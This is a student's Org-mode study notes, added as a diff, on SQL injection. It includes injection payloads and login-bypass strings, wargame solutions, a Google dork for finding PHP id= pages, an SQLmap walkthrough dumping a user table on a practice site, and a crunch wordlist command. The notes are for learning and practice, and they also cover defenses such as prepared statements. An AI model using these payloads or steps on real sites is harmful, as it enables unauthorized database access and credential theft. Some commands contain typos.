@@ -1,0 +1,333 @@
+* Learn SQLi                                       :school:homework:project:
+** How SQL injection works                                 :school:homework:
+     CLOSED: [2020-12-19 Sat 19:37]
+     :PROPERTIES:
+     :ID:       51b42eba-f73b-4b56-974e-b84179b4c472
+     :END:
+     :LOGBOOK:
+     CLOCK: [2020-12-18 Fri 09:54]--[2020-12-18 Fri 10:24] =>  0:30
+     :END:
+     *[[https://www.youtube.com/watch?v=_jKylhJtPmI][Computerphile video link]]*
+*** What is vulnerable to SQL injection?
+      :PROPERTIES:
+      :ID:       26ff3d7a-e71a-4d49-862e-e5b7856d2c24
+      :END:
+- Mostly legacy or shitty sites
+- Websites that use PHP
+  - PHP runs server-side
+  - Often login forms
+  - Unsanitized forms
+- Allows for quote marks and other special symbols to be inserted in to the form
+  - "injecting"
+*** How SQL code injection works
+      :PROPERTIES:
+      :ID:       54ba157a-0c72-4f97-8800-b62f56ea25a1
+      :END:
+- Data gets sent via POST request, PHP constructs an SQL query, SQL query is then run, results are then used (sometimes sent back, etc etc)
+- Quote marks can change how something is interpreted
+- Consider this example:
+  - There is a form that asks for a username
+  - Entering joe into the form makes the SQL interpreted look like this:
+    #+BEGIN_SRC sql
+    SELECT * FROM USERS WHERE USERNAME = 'joe'
+    #+END_SRC
+    - This runs normally, and everything works fine
+  - Sending "joe'" (without the dquotes) would make it look like this (providing the form is unsanitized):
+    #+BEGIN_SRC sql
+    SELECT * FROM USERS WHERE USERNAME = 'joe''
+    #+END_SRC
+    - This doesn't run correctly, and the SQL has an issue
+    - The quote marks don't match up and it gets screwed up
+- You can do a lot of bad stuff just by inserting the quotes
+  - One can make it run other stuff
+    - Sending "joe' OR 1=1" selects everything (something that is always true acts like a wildcard)
+      #+BEGIN_SRC sql
+      SELECT * FROM USERS WHERE USERNAME = 'joe' OR 1=1
+      #+END_SRC
+    - Sending "joe'; DELETE EVERYTHING" will /really/ cause headaches for everyone there
+      #+BEGIN_SRC sql
+      SELECT * FROM USERS WHERE USERNAME = 'joe'; DELETE EVERYTHING
+      #+END_SRC
+      - It literally deletes everything 
+    - Keywords that can wreak havoc:
+      - DELETE :: Does what it sounds like.
+      - UPDATE :: Changes stuff.
+      - INSERT :: Adds new stuff.
+      - DROP :: Deletes whole tables, columns, databases, etc.
+*** SQL (programming)
+      :PROPERTIES:
+      :ID:       f042122f-e791-4e97-bfb8-28b4846124cb
+      :END:
+      :BACKLINKS:
+      [2020-12-19 Sat 19:47] <- [[id:5107d188-a937-4625-a858-16b27c0e9df0][Manually checking]]
+      [2020-12-19 Sat 18:52] <- [[id:40aeb44a-da7f-40fd-89ff-85dd68c1d73f][PHP (programming)]]
+      :END:
+- Programming language for databases
+- Almost plain-english
+- Sends a request/query to a database, gives a response from the database
+**** Creation of SQL
+       :PROPERTIES:
+       :ID:       c290916e-44fd-49e5-bee0-ff0cfaa479ae
+       :END:
+- Created so that you could search files and stuff near the invention of the WWW
+- 
+*** PHP (programming)
+      :PROPERTIES:
+      :ID:       40aeb44a-da7f-40fd-89ff-85dd68c1d73f
+      :END:
+- Scripting language
+- Easy to write in
+- Runs server-side
+- Can easily be insecure
+- Often used in conjunction with [[id:f042122f-e791-4e97-bfb8-28b4846124cb][SQL]]
+** TODO SQL Injection Practice+Notes
+     :PROPERTIES:
+     :ID:       0b7cc919-dea1-4dfe-b20c-85c3393dbfa9
+     :END:
+[[wechall.net/active_sites][Place to find sites]]
+*** 2021-01-04: RedTiger Lvl 1
+      :LOGBOOK:
+      CLOCK: [2021-01-04 Mon 14:42]--[2021-01-04 Mon 15:59] =>  1:17
+      :END:
+[[redtiger.labs.overthewire.org/level1.php][Link]]
+- Target :: Get the login for user Hornoxe
+- Hint :: n/a
+- Tablename :: level1_users
+- Solution :: using cURL is one way, but can also be put as a URL into the web browser
+  - Solution is below
+  #+BEGIN_SRC bash
+  --silent --insecure "https://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,username,password%20from%20leve1_users"
+  #+END_SRC
+- How the solution works:
+  - cURL visits the site
+  - After the question mark, it is making the request
+  - FROM designates the table
+  - UNION combines the results together, so it shows everything
+  - Select selects the stuff
+*** 2020-01-04: RedTiger Lvl 2
+- Target :: login bypass
+- Hint :: n/a
+- Solution :: bypass it really easy with the code blow:
+  #+BEGIN_SRC sql
+  ' OR 1='1
+  #+END_SRC
+  - Allows 
+*** 2020-01-06: HackThisSite easy missions 
+:PROPERTIES:
+:ID:       9bd94729-aaf5-4b95-80d0-eca2741eab35
+:END:
+Honestly too easy to put the solutions here, it would be a waste of time
+*** 2020-01-07: TechPanda SQL injection
+[[techpanda.org/index.php]]
+- Easy enough
+- Solution:
+  #+BEGIN_SRC sql
+  asdf') OR 1=1 -- ]
+  #+END_SRC
+  - How it works :: This goes in the password field. The request created hashes the passwords, hence the inclusion of the parenthesis (the hashing bit looks like algorithm('password') so we have to close the parenthesis). Otherwise, just a regular login bypass
+*** 2020-01-07: The Lord of the SQLi
+[[https://los.rubiya.kr]]
+The first three are easy or whatever.
+First one
+** Defending against SQL injection
+     :PROPERTIES:
+     :ID:       312ddd02-5c79-4418-9cf5-c17dd05e924a
+     :END:
+     - Escaping characters :: Make it go through and put a back/forward/whatever slash before dangerous characters like quotes, making them not run stuff. Not a good way to do it.
+     - Prepared statements :: The correct way. Put a question mark, and then later fill it and treat it as just text and as unsafe (gross oversimplification).
+** Tools for SQLi
+*** SQL Fiddle
+[[https://sqlfiddle.com][Link]]
+- Allows you to run SQL code online
+- Useful to see what you can do with it
+- Put the backend code on the left pane
+- Put the request code on the right pane
+*** SQLmap
+- Used for automated SQL injection
+- Preinstalled with Kali Linux
+**** When to use
+- 
+* TODO [#B] Udemy Course SQLi Notes + Make Cheatsheet
+DEADLINE: <2021-02-05 Fri>
+:PROPERTIES:
+:ID:       f125ec4b-563f-4f01-99e9-d221a807a1ec
+:END:
+:LOGBOOK:
+CLOCK: [2021-01-18 Mon 13:12]--[2021-01-18 Mon 13:20] =>  0:08
+:END:
+** Database attack basics
+*** How SQL queries work
+- Client sends a request to database
+- Database constructs query from that
+- Runs the query and then returns the results
+- SQL is used to communicate
+*** How SQL attacks work
+- You send malicious content to the database, and it sends back the stuff you want
+- You can get IDs, password hashes, emails, and usernames
+*** Database structure
+- Data is the lowest thing
+  - It is the actual stuff
+  - Data is what you are after
+- Data is contained in rows and columns
+  - Each person/item has their/its own row
+  - Each person's data corresponds to a different column
+- Columns are in tables
+  - You might have a column for username, hashed password, and email
+- Tables are in the database
+  - You might have four different tables in a database
+  [[/home/jadench/Documents/School/Apocalypse-2021_School_Year/Science_Research/sqlInjection.org_2021-01-18_131405_z5O9l3.png]]
+**** You gather information in this order
+1. Find the database and the interface to it
+2. Find the names of the tables
+3. Find the names of the columns in the tables
+4. Get the actual rows of data
+** SQLmap cheatsheet
+:LOGBOOK:
+CLOCK: [2021-01-22 Fri 09:50]--[2021-01-22 Fri 10:31] =>  0:41
+CLOCK: [2021-01-18 Mon 13:20]--[2021-01-18 Mon 13:34] =>  0:14
+:END:
+*** Overview of SQLmap
+- CLI tool
+- Prepackaged with Kali Linux
+- Is an automatic sql injection tool
+- Best tool for this in Kali Linux
+*** Command line options
+:PROPERTIES:
+:ID:       53ccfc85-7fbc-42d5-937d-97e6b3f8af3e
+:END:
++ ~--dbs~ :: Scans for databases. [[id:0918c9b6-0e12-4b4d-83b7-df782012847f][Example]]
++ ~-D~ :: allows you to specify a database. [[id:37b1b496-a771-4681-bde4-2cdd08b2e51b][Example where database is specified]]
++ ~-T~ :: Specifies a table name. [[id:b4884a91-fece-49be-ac19-9b3da86333a3][Example]]
++ ~-C~ :: Specifies a column name. Often paired with ~--dump~ to dump all data from column. [[id:2b9427b6-0bcf-4f2c-813a-ae6e1eed20af][Example]]
++ ~--tables~ :: Returns the tables in a database. [[id:37b1b496-a771-4681-bde4-2cdd08b2e51b][Example]]
++ ~--columns~ :: Returns the columns in a table. [[id:b4884a91-fece-49be-ac19-9b3da86333a3][Example]]
+*** Setup to attack website 
+**** Find the URL with PHP
+- Copy the URL, then go into a new tab with google
+- type site://whatever.url/ php?id=
+- Searches the base URL for all of the different PHP things
+**** Understand the legality of doing this
+Unless it's your site, you have express permission, or its for that purpose, don't do it.
+*** Attack the website
+**** Find the database names with SQLmap
+:PROPERTIES:
+:ID:       0918c9b6-0e12-4b4d-83b7-df782012847f
+:END:
+:BACKLINKS:
+[2021-01-28 Thu 09:44] <- [[id:53ccfc85-7fbc-42d5-937d-97e6b3f8af3e][Command line options]]
+:END:
+#+BEGIN_SRC bash
+sqlmap -u "testphp.vulnweb.com/artists.php?artist=1" --dbs
+#+END_SRC
+- Finds the databases of the website
+- Figures out that backend is MySQL, and asks if we want to skip test payloads for other DBMSes
+  - DBMS stands for database management system
+  - Answer yes
+- Asks if you want to include all tests for MySQL
+  - Answer yes
+- Let the test run and figure stuff out
+- Don't test for other stuff
+- Returns two available databases
+  - acuart 
+  - information_schema
+  - We will target acuart
+**** Find tables within database
+:PROPERTIES:
+:ID:       37b1b496-a771-4681-bde4-2cdd08b2e51b
+:END:
+:BACKLINKS:
+[2021-01-28 Thu 09:47] <- [[id:53ccfc85-7fbc-42d5-937d-97e6b3f8af3e][Command line options]]
+[2021-01-28 Thu 09:45] <- [[id:53ccfc85-7fbc-42d5-937d-97e6b3f8af3e][Command line options]]
+:END:
+#+BEGIN_SRC bash
+sqlmap -u "testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+#+END_SRC
+- Figures out the tables in the database "acuart"
+- Returns tables:
+  - artists
+  - carts
+  - categ
+  - featured
+  - guestbook
+  - pictures
+  - products
+  - users
+**** Get the columns from a table
+:PROPERTIES:
+:ID:       b4884a91-fece-49be-ac19-9b3da86333a3
+:END:
+:BACKLINKS:
+[2021-01-28 Thu 09:49] <- [[id:53ccfc85-7fbc-42d5-937d-97e6b3f8af3e][Command line options]]
+[2021-01-28 Thu 09:49] <- [[id:53ccfc85-7fbc-42d5-937d-97e6b3f8af3e][Command line options]]
+:END:
+#+BEGIN_SRC bash
+sqlmap -u "testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns
+#+END_SRC
+- Finds the columns in the table users in the database acuart
+- Finds eight columns:
+  |---------+--------------|
+  | Column  | Type         |
+  |---------+--------------|
+  | name    | varchar(100) |
+  | address | mediumtext   |
+  | cart    | varchar(100) |
+  | cc      | varchar(100) |
+  | email   | varchar(100) |
+  | pass    | varchar(100) |
+  | phone   | varchar(100) |
+  | uname   | varchar(100) |
+  |---------+--------------|
+**** Get data from columns10
+#+BEGIN_SRC bash
+sqlmap -u "testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
+#+END_SRC
+- 
+- Returns:
+  ~[1 entry]~
+  |-------|
+  | uname |
+  |-------|
+  | test  |
+  |-------|
+**** Get data from column
+:PROPERTIES:
+:ID:       2b9427b6-0bcf-4f2c-813a-ae6e1eed20af
+:END:
+:BACKLINKS:
+[2021-01-28 Thu 09:47] <- [[id:53ccfc85-7fbc-42d5-937d-97e6b3f8af3e][Command line options]]
+:END:
+~sqlmap -u "testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump~
+- Retrieves all data from the column "pass"
+- Returns:
+  |------|
+  | pass |
+  |------|
+  | test |
+  |------|
+**** Sign in with data we found
+- Uses the data we got by sql injection
+- Username :: test
+- Pasword :: test
+**** Data storage locations
+Everything sqlmap does to a site is shown in ~~/.local/share/sqlmap/output/$url~
+- Includes logs, target, session, and a bunch of other stuff
+- SQLmap tables are usually dumped to ~~/.local/share/sqlmap/output/$url/dump/$tablename/~
+** Crunch cheatsheet
+Crunch is a tool that is used to create personal dictionaries or other things for cracking. It can create:
+- Wordlists
+- Dictionaries
+- Other stuff
+*** Command line options
+Crunch commands are formatted like this: ~crunch <min> <max> <charlist> [options]~
+- ~<min>~ :: Specifies the minimum number of characters (like 2 would mean down to two char long). Integer.
+- ~<max>~ :: Specifies the maximum number of characters (like 5 would mean up to 5 char long). Integer.
+- ~<charlist>~ :: A string that gives the characters you want in your wordlist. Example: "abcd123", which would give all the combinations between ~<min>~ and ~<max>~ characters using only a, b, c, d, 1, 2, and 3.
+  - To add characters like a double quote or single quote, escape them with a backslash
+- ~-o~ :: Specifies the output file. Normally, crunch prints to stdout, but it's often more useful to write to a file.
+*** Usage
+Example command:
+~$ crunch 8 10 "abcdefghijklmnopqrstuvwxyz0123456789" -o passwordCrunch.txt~
+- Creates all alphanumeric (no capitals) combinations between 8 and 10 characters and saves it to passwordCrunch.txt
+- Creates a large file (you are warned about this)
+** 
+
